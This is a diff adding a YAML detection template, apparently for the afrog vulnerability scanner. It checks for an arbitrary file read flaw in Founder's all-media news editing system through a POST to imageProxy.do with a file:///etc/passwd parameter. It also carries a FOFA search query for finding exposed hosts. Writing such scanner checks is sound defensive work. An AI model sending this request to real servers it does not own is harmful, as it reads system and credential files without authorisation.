@@ -1,0 +1,21 @@
+id: founder-image-proxy-do-fileread
+
+info:
+  name: 方正畅享全媒体新闻采编系统 imageProxy.do 任意文件读取
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    方正畅享全媒体新闻采编系统 imageProxy.do 接口存在任意文件读取漏洞，攻击者通过构造特定请求可读取服务器上的敏感信息。
+    fofa: app="FOUNDER-全媒体采编系统"
+  tags: 方正,方正畅享全媒体新闻采编系统,fileread
+  created: 2025/03/10
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /newsedit/outerfotobase/imageProxy.do
+      body: oriImgUrl=file:///etc/passwd
+    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
